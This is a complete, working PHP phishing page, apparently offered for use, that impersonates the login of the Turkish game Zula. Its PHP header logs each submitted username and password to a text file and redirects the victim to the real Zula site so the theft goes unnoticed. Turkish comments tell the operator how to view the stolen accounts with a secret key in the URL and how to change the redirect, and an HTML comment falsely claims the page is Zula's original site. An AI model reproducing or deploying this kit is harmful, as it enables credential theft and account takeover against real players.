<?php
/*
Author: xr4zz3rs
Website: https://realitycheats.com
Instagram: https://instagram.com/xr4zz3rs
Telegram: https://t.me/xr4zz3rs
Github: https://github.com/xr4zz3rs
*/

error_reporting(0);
require_once("CSRF.php");
$CSRF = new CSRF();

if(isset($_POST['girisButon'])){
	switch($CSRF->checkToken($_POST['csrf-token'])){
 		case false:
            die('<meta http-equiv="refresh" content="0; URL=./"/>'); //Hack işlemlerini engelliyoruz!!!
            exit();
		break;
	}
}

$key = "benidegisin"; //Dosya adlarını vs böyle yapar. Ek olarak: http://localhost/zula/index.php?key=benidegisin şeklinde loglanan hesapları görebilirsiniz.
$getKey = htmlspecialchars($_GET["key"]);
$kullaniciadi = htmlspecialchars($_POST["kullaniciadi"]);
$sifre = htmlspecialchars($_POST["sifre"]);

if(empty($getKey))
{
    if($_POST)
    {
        if(!empty($kullaniciadi) || !empty($sifre))
        {
            //Log kaydedildi.
            file_put_contents("$key.txt", "Kullanıcı Adı: $kullaniciadi Şifre: $sifre\n", FILE_APPEND);

            //Log kaydediltiken sonra yapılacaklar;
            header("Location: https://hesap.zulaoyun.com/sayfalar/lp_elenavezeynepv3"); //Ben burada zula'nın gerçek sitesinin login kısmına yönlendirdim, değişebilirsiniz.
        }
    }
}
else if($getKey == $key)
{
    die(nl2br("<font color='red'>Siteye loglanan kullanıcılar;</font>\n\n<font color='green'>".file_get_contents("$key.txt")."</font>"));
}
?>

<!-- Bu site orijinal ZulaOyun'un sitesidir. -->
<!DOCTYPE html>
<html>
<head>
<style>.async-hide { opacity: 0 !important} </style>
<title>ZULA - İLK VE TEK TÜRK YAPIMI MMOFPS OYUNU</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<meta name="description" content="ZULA - İLK VE TEK TÜRK YAPIMI MMOFPS OYUNU" />
<meta name="keywords" content="zula beta,kapalı beta,zula,zulaoyun,zula oyna,zula indir,zula yükle,yerli fps,yerli mmofps,türk yapımı,mmofps,türkçe oyun,ücretsiz fps,ücretsiz mmofps,fps,oyun,ücretsiz oyna,%100 türkçe,zula kayıt ol,zula üye ol,lokum games,lokum,ücretsiz oyun,zula kaydol,mafya oyunu,savaş oyunu,türk oyunu,zula kaydol" />
<meta property="og:title" content="ZULA - İLK VE TEK TÜRK YAPIMI MMOFPS OYUNU" />
<meta property="og:description" content="ZULA - İLK VE TEK TÜRK YAPIMI MMOFPS OYUNU" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://www.zulaoyun.com/" />
<link rel="stylesheet" href="css/bootstrap.css" />  
<link rel="stylesheet" href="css/register-landing.css?v=20201117" />
<link rel="icon" href="images/favicon-v2.ico" type="image/x-icon" />
<link rel="stylesheet" href="css/fontawesome-all.css" />
<link rel="stylesheet" href="css/landingpage-style.css" />
<script type="text/javascript" src="js/jquery-2.1.3.js"></script>
<script type="text/javascript" src="js/jquery.validate.js"></script>
<script type="text/javascript" src="js/jquery.validate.unobtrusive.js"></script>
<script type="text/javascript" src="js/jquery.unobtrusive-ajax.js"></script>
<script src="js/bootstrap.js"></script>
<style>
    #downloadModal .modal-content {
        border-radius: 3px;
    }

    #downloadModal a .img-responsive {
        box-shadow: 1px 1px 5px 1px #333;
        border-radius: 3px;
        padding: 10px;
        transition: all .3s;
    }

    #downloadModal a .img-responsive:hover {
        box-shadow: 1px 1px 15px 1px #333;
    }

    .complete-profile {
        display: block;
        margin-top: 10px;
        color: #fff;
        font-family: Arial;
        position: relative;
        z-index: 2;
        text-transform: unset;
    }

    .complete-profile:hover {
        color: #fff;
    }
</style>
</head>
<body>

<div class="container">
    <div class="logo">
        <img alt="Zula" src="images/zula-logo-with-slogan.png"/>
    </div>
    <div class="tab">
        <div class="tab-nav">
            <a href="#login" class="tab-link active">Giriş Yap</a>
        </div>
        <div class="tab-contents">
            <div class="tab-content active" id="login">
                <form method="post" id="login-form" class="passive">
                    <div class="form-group">
                        <span class="icon"><i class="fas fa-user fa-fw"></i></span>
                        <input type="text" name="kullaniciadi" class="form-control valid" placeholder="Kullanıcı Adı" />
                        <div class="input-error username-error"></div>
                    </div>
                    <div class="form-group">
                        <span class="icon"><i class="fas fa-key fa-fw"></i></span>
                        <input type="password" name="sifre" class="form-control valid" placeholder="Şifre" />
                        <div class="input-error password-error"></div>
                    </div>
                    <div class="form-group">
                        <label class="check-wrapper">
                            <input type="checkbox" name="benihatirla" value="true" />
                            <span class="check-box"></span>
                            <span class="check-text">
                                Beni hatırla
                            </span>
                        </label>
                    </div>
                    <input type="hidden" name="RedirectUrl" />
                    <button type="submit" name="girisButon" class="button form-button">
                        GİRİŞ YAP
                    </button>
                <input name="csrf-token" type="hidden" value="<?php echo $CSRF->getToken(); ?>"/></form>
            </div>
        </div>
    </div>
</div>